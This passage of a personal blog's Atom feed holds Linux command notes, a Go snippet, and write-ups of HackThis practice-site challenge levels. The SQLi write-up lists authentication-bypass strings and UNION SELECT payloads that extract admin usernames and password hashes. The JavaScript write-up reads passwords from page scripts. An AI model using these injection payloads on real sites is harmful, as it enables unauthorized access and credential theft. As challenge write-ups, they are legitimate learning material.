+</span><span class='line'>kill %1</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>for pid in $(ps -ef | awk '/some search/ {print $2}'); do kill -9 $pid; done</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>pkill</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>pkill shardkv.test</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>ls</h2>
+
+<ul>
+<li>-F(&ndash;classify): append indicator (one of <code>*/=&gt;@|</code>) to entries</li>
+<li><p>-1: list 1 file per line</p></li>
+<li><p><code>/</code> is a directory</p></li>
+<li><code>@</code> is a symlink</li>
+<li><code>|</code> is a named pipe (fifo)</li>
+<li><code>=</code> is a socket.</li>
+<li><code>*</code> for executable files</li>
+<li><code>&gt;</code> is for a &ldquo;door&rdquo; &ndash; a file type currently not implemented for Linux, but supported on Sun/Solaris.</li>
+</ul>
+
+
+<h2>lsb_release</h2>
+
+<p>Linux Standard Base.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>lsb_release -a
+</span><span class='line'>cat /etc/issue</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>lsof</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>lsof -u edxapp</span></code></pre></td></tr></table></div></figure>
+
+
+<p>lsof: list open files</p>
+
+<h2>man</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>man 2 stat</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The number corresponds to what section of the manual that page is from. The man page for man itself (man man) explains it and lists the standard ones:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>1      User Commands
+</span><span class='line'>2      System Calls
+</span><span class='line'>3      C Library Functions
+</span><span class='line'>4      Devices and Special Files
+</span><span class='line'>5      File Formats and Conventions
+</span><span class='line'>6      Games et. al.
+</span><span class='line'>7      Miscellanea
+</span><span class='line'>8      System Administration tools and Daemons</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>meminfo</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat /proc/meminfo</span></code></pre></td></tr></table></div></figure>
+
+
+<p>MemFree: The amount of physical RAM, in kilobytes, left unused by the system.</p>
+
+<p>MemAvailable: An estimate of how much memory is available for starting new applications, without swapping. Calculated from MemFree, SReclaimable, the size of the file LRU lists, and the low watermarks in each zone. The estimate takes into account that the system needs some page cache to function well, and that not all reclaimable slab will be reclaimable, due to items being in use. The impact of those factors will vary from system to system.</p>
+
+<h2>mkdir</h2>
+
+<ul>
+<li>-p: no error if existing, make parent directories as needed</li>
+</ul>
+
+
+<h2>netstat</h2>
+
+<ul>
+<li>-n: &ndash;numeric</li>
+<li>-p: &ndash;program</li>
+<li>-e: &ndash;extend</li>
+<li>-a: &ndash;all</li>
+<li>-u: UDP</li>
+<li>-t: TCP</li>
+</ul>
+
+
+<h2>option flags</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>echo $-
+</span><span class='line'>himBH</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>h: hashall:</li>
+<li>i: interactive</li>
+<li>m: monitor mode: <code>CTRL+Z</code>, <code>fg</code></li>
+<li>H: history expand: <code>~/.bash_history</code>, <code>!!</code></li>
+<li>B: brace expansion: <code>cp file{,.bak}</code></li>
+</ul>
+
+
+<p><code>if [ "${-#*i}" != "$-" ]</code> checking if your shell is interactive or not</p>
+
+<h2>passwd</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>vi /etc/passwd
+</span><span class='line'>sudo vi /etc/shadow</span></code></pre></td></tr></table></div></figure>
+
+
+<p>GECOS(comments field): general electric comprehensive operating system.</p>
+
+<h2>pgrep</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>pgrep std_run.sh</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>ps</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ps aux
+</span><span class='line'>ps -f -u songzy</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>pscp</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>pscp songzy12@taoli.tsinghuax.org:Code-Craft/future_net.tar.gz .
+</span><span class='line'>pscp songzy12@taoli.tsinghuax.org:Code-Craft/future_net/route.cpp .</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>scp</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>scp -r remote_username@remote_ip:remote_folder local_folder</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>service</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>service ssh status
+</span><span class='line'>service ssh restart
+</span><span class='line'>netstat –nlp | grep 22</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>shift</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/bin/bash
+</span><span class='line'>echo "Input: $@"
+</span><span class='line'>shift 3
+</span><span class='line'>echo "After shift: $@"</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ myscript.sh one two three four five six
+</span><span class='line'>
+</span><span class='line'>Input: one two three four five six
+</span><span class='line'>After shift: four five six</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>ssh-keygen</h2>
+
+<p>client:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ssh-keygen -t rsa</span></code></pre></td></tr></table></div></figure>
+
+
+<p>server:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat id_dsa.pub &gt;&gt; ~/.ssh/authorized_keys
+</span><span class='line'>chmod 600 authorized_keys
+</span><span class='line'>chmod 700 -R .ssh</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>-t: type</li>
+<li>-b: bits</li>
+<li>-C: comment</li>
+</ul>
+
+
+<h2>source</h2>
+
+<p>It executes the content of the file in the current shell.</p>
+
+<p>synonym: <code>.</code> (period).</p>
+
+<h2>squid</h2>
+
+<p>Squid（乌贼） is a caching and forwarding web proxy.</p>
+
+<h2>sticky bit</h2>
+
+<p>Once set, only the file&rsquo;s owner, the directory&rsquo;s owner, or root user can rename or delete the file.</p>
+
+<ul>
+<li>t: <code>chmod o+t /opt/dump/</code></li>
+<li>1: <code>chmod 1757 /opt/dump/</code></li>
+</ul>
+
+
+<h2>su</h2>
+
+<p>su (short for substitute user)</p>
+
+<h2>tar</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tar zxvf backups.tgz
+</span><span class='line'>tar xvf jacana-data.tar.bz2</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>-z : Uncompress the resulting archive with gzip command.</li>
+<li>-x : Extract to disk from the archive.</li>
+<li>-v : Produce verbose output i.e. show progress and file names while extracting files.</li>
+<li>-f backup.tgz : Read the archive from the specified file called backup.tgz.</li>
+<li>-C /tmp/data : Unpack/extract files in /tmp/data instead of the default current directory.</li>
+</ul>
+
+
+<h2>unzip</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>unzip '*.zip'
+</span><span class='line'>unzip -v test.zip
+</span><span class='line'>unzip -o test.zip -d tmp/</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>gunzip</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gunzip file.gz
+</span><span class='line'>gzip -d file.gz</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>tee</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tee </span></code></pre></td></tr></table></div></figure>
+
+
+<p>In computing, <code>tee</code> is a command in command-line interpreters (shells) using standard streams which reads standard input and writes it to both standard output and one or more files, effectively duplicating its input.</p>
+
+<h2>terminal</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ctrl+u
+</span><span class='line'>ctrl+k</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>top</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>top
+</span><span class='line'>cat /proc/cpuinfo
+</span><span class='line'>cat /proc/meminfo</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>tree</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo gedit /etc/apt/sources.list
+</span><span class='line'>deb http://us.archive.ubuntu.com/ubuntu xenial main universe
+</span><span class='line'>sudo apt-get update
+</span><span class='line'>sudo apt-get install tree</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>type</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>type ls
+</span><span class='line'>type cd</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>wc</h2>
+
+<ul>
+<li>-l: print the newline counts</li>
+</ul>
+
+
+<h2>wget</h2>
+
+<ul>
+<li>-O: write documents to FILE</li>
+<li>-o: log messages to FILE</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>--2016-11-03 01:59:25--  http://pasky.or.cz/dev/brmson/glove.6B.50d.txt.gz
+</span><span class='line'>Resolving pasky.or.cz (pasky.or.cz)... 80.243.110.53, 2a01:8c00:ff00:8320::
+</span><span class='line'>Connecting to pasky.or.cz (pasky.or.cz)|80.243.110.53|:80... connected.
+</span><span class='line'>HTTP request sent, awaiting response... 200 OK
+</span><span class='line'>Length: 69182520 (66M) [application/x-gzip]
+</span><span class='line'>Saving to: ‘glove.6B.50d.txt.gz.4’
+</span><span class='line'>
+</span><span class='line'>glove.6B.50d.txt.gz.  48%[=========&gt;            ]  32.03M  8.27MB/s    in 5.9s
+</span><span class='line'>
+</span><span class='line'>2016-11-03 01:59:32 (5.43 MB/s) - Read error at byte 33586057/69182520 (Connection reset by peer). Retrying.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>But I can use browser to download.</p>
+
+<hr />
+
+<h2>putty</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Network error: software caused connection abort</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo service ssh restart </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Test <code>127.0.0.1:7777</code>, they have the same behavior.</p>
+
+<p>The SSH server service in Ubuntu is named &ldquo;ssh&rdquo;.</p>
+
+<p>Just power off and restart.</p>
+
+<hr />
+
+<h2>cmd</h2>
+
+<h3>%~dp0</h3>
+
+<ul>
+<li><code>%0</code>: the batch file itself</li>
+<li><code>%1</code>-<code>%9</code>:  command line arguments</li>
+<li><code>d</code>: the drive letter</li>
+<li><code>p</code>: the path of the parameter</li>
+</ul>
+
+
+<h3>cls</h3>
+
+<p>clean screen.</p>
+
+<h3>findstr</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>type *.md | findstr "&lt;p&gt;"</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>mode</h3>
+
+<p>Sets the number of lines and columns (characters/line) of the display.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mode con cols=100 lines=60</span></code></pre></td></tr></table></div></figure>
+
+
+<hr />
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Go]]></title>
+    <link href="http://songzy12.github.io/blog/2017/04/06/go/"/>
+    <updated>2017-04-06T17:01:15+08:00</updated>
+    <id>http://songzy12.github.io/blog/2017/04/06/go</id>
+    <content type="html"><![CDATA[<h2>timeout</h2>
+
+<p>select: non-blocking channel operations</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>timeout := make (chan bool, 1)
+</span><span class='line'>go func() {
+</span><span class='line'>    time.Sleep(1e9) // sleep one second
+</span><span class='line'>    timeout &lt;- true
+</span><span class='line'>}()
+</span><span class='line'>ch := make (chan int)
+</span><span class='line'>select {
+</span><span class='line'>case &lt;- ch:
+</span><span class='line'>case &lt;- timeout:
+</span><span class='line'>    fmt.Println("timeout!")
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Crypt]]></title>
+    <link href="http://songzy12.github.io/blog/2017/04/04/crypt/"/>
+    <updated>2017-04-04T22:20:23+08:00</updated>
+    <id>http://songzy12.github.io/blog/2017/04/04/crypt</id>
+    <content type="html"><![CDATA[<h2>Crypt Level 1</h2>
+
+<p>Just read the message backwards.</p>
+
+<h2>Crypt Level 2</h2>
+
+<p>Shift the letters.</p>
+
+<h2>Crypt Level 3</h2>
+
+<p>[morse]<a href="https://zh.wikipedia.org/zh-hans/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81">https://zh.wikipedia.org/zh-hans/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81</a>.</p>
+
+<h2>Crypt Level 4</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Dc
+</span><span class='line'>Hi
+</span><span class='line'>Jhll
+</span><span class='line'>Pass
+</span><span class='line'>
+</span><span class='line'>abcdefghijklmnopqrstuvwxyz
+</span><span class='line'>fxihxxtaxpdsnrgxemlxwxvxco  
+</span><span class='line'>
+</span><span class='line'>cdhwqancqmkl
+</span><span class='line'>ihavefriends</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Crypt Level 5</h2>
+
+<p><a href="https://quipqiup.com/">substitution ciphers</a></p>
+
+<h2>Crypt Level 6</h2>
+
+<p><a href="https://en.wikipedia.org/wiki/Steganography">steganography</a></p>
+
+<p>Audacity` for audio processing.</p>
+
+<p><a href="https://en.wikipedia.org/wiki/Maya_numerals">Maya numerals</a>.</p>
+
+<p><a href="http://chxo.com/scripts/hex2string.php">hexadecimal converter</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Coding]]></title>
+    <link href="http://songzy12.github.io/blog/2017/04/03/coding/"/>
+    <updated>2017-04-03T22:12:25+08:00</updated>
+    <id>http://songzy12.github.io/blog/2017/04/03/coding</id>
+    <content type="html"><![CDATA[<h2>Coding Level 1</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$($('textarea')[1]).val($($('textarea')[0]).val().split(', ').sort().join(', ')); $('input.button').click();</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Coding Level 2</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>s = '';
+</span><span class='line'>for( var i = 32; i &lt;= 126; i++ )
+</span><span class='line'>    s += String.fromCharCode( i );
+</span><span class='line'>
+</span><span class='line'>cipher = $($('textarea')[0]).val().split(",");
+</span><span class='line'>m = function(item) { if (item == " ") return " "; else return s[s.length-1-s.indexOf(String.fromCharCode(parseInt(item)))]};
+</span><span class='line'>plain = cipher.map(m).join('');
+</span><span class='line'>$($('textarea')[1]).val(plain);
+</span><span class='line'>$('input.button').click();</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[SQLi]]></title>
+    <link href="http://songzy12.github.io/blog/2017/04/03/sqli/"/>
+    <updated>2017-04-03T15:25:46+08:00</updated>
+    <id>http://songzy12.github.io/blog/2017/04/03/sqli</id>
+    <content type="html"><![CDATA[<h2>SQLi Level 1</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>songzy' or 1=1 or '1'='1
+</span><span class='line'>passwd</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>SQLi Level 2</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>https://www.hackthis.co.uk/levels/sqli/2?browse&q=a</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>https://www.hackthis.co.uk/levels/sqli/2?browse&q=%27a</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>DEBUG: SELECT username, admin FROM members WHERE username LIKE ''a%'</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>https://www.hackthis.co.uk/levels/sqli/2?browse&q=a%27UNION%20ALL%20SELECT%20username,%20password%20FROM%20members%20WHERE%20admin=1--</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bellamond</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Using comments to even block the rest of the query:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>' OR '1'='1' --
+</span><span class='line'>' OR '1'='1' ({
+</span><span class='line'>' OR '1'='1' /* </span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>https://www.hackthis.co.uk/levels/sqli/2?browse&q=a%27UNION%20ALL%20SELECT%20password,%202%20FROM%20members%20WHERE%20username=%27bellamond%27--</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>1b774bc166f3f8918e900fcef8752817bae76a37</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>Crack Station</code></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[JavaScript]]></title>
+    <link href="http://songzy12.github.io/blog/2017/04/02/javascript/"/>
+    <updated>2017-04-02T23:04:43+08:00</updated>
+    <id>http://songzy12.github.io/blog/2017/04/02/javascript</id>
+    <content type="html"><![CDATA[<h2>Javascript Level 1</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script type='text/javascript'&gt; 
+</span><span class='line'>$(function(){ 
+</span><span class='line'>  $('.level-form').submit(function(e){ 
+</span><span class='line'>      e.preventDefault(); 
+</span><span class='line'>      if(document.getElementById('pass').value == correct) { 
+</span><span class='line'>          document.location = '?pass=' + correct; 
+</span><span class='line'>      } else { 
+</span><span class='line'>          alert('Incorrect password') 
+</span><span class='line'>      } 
+</span><span class='line'>  })
+</span><span class='line'>})
+</span><span class='line'>&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> &lt;script type='text/javascript'&gt; var correct = 'jrules' &lt;/script&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Javascript Level 2</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script type='text/javascript'&gt; 
+</span><span class='line'>$(function(){ 
+</span><span class='line'>  $('.level-form').submit(function(e){ 
+</span><span class='line'>      e.preventDefault(); 
+</span><span class='line'>      if ($('.level-form #pass')[0].value.length == length) { 
+</span><span class='line'>          document.location = "2?x=" + length; 
+</span><span class='line'>      } else { 
+</span><span class='line'>          alert('Incorrect Password'); 
+</span><span class='line'>      } 
+</span><span class='line'>  }); 
+</span><span class='line'>}); 
+</span><span class='line'>&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script type='text/javascript'&gt;
+</span><span class='line'>    var length = 5;
+</span><span class='line'>    var x = 3;
+</span><span class='line'>    var y = 2;
+</span><span class='line'>    y = Math.sin(118.13);
+</span><span class='line'>    y = -y;
+</span><span class='line'>    x = Math.ceil(y);
+</span><span class='line'>    y++;
+</span><span class='line'>    y = y+x+x;
+</span><span class='line'>    y *= (y/2);
+</span><span class='line'>    y++;
+</span><span class='line'>    y++;
+</span><span class='line'>    length = Math.floor(y);
+</span><span class='line'>&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Javascript Level 3</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script type='text/javascript'&gt; 
+</span><span class='line'>var thecode = 'code123'; 
+</span><span class='line'>$(function(){ 
+</span><span class='line'>  $('.level-form').submit(function(e){ 
+</span><span class='line'>      e.preventDefault(); 
+</span><span class='line'>      if ($('.level-form #pass')[0].value == thecode) { 
+</span><span class='line'>          document.location = "?pass=" + thecode; 
+</span><span class='line'>      } else { 
+</span><span class='line'>          alert('Incorrect Password'); 
+</span><span class='line'>      } 
+</span><span class='line'>  }); 
+</span><span class='line'>}); 
+</span><span class='line'>&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>getinthere</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script type='text/javascript' src='https://hackthis-10af.kxcdn.com/files/js/min/main.js?1446747682'&gt;&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>var thecode='getinthere';</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Javascript Level 4</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
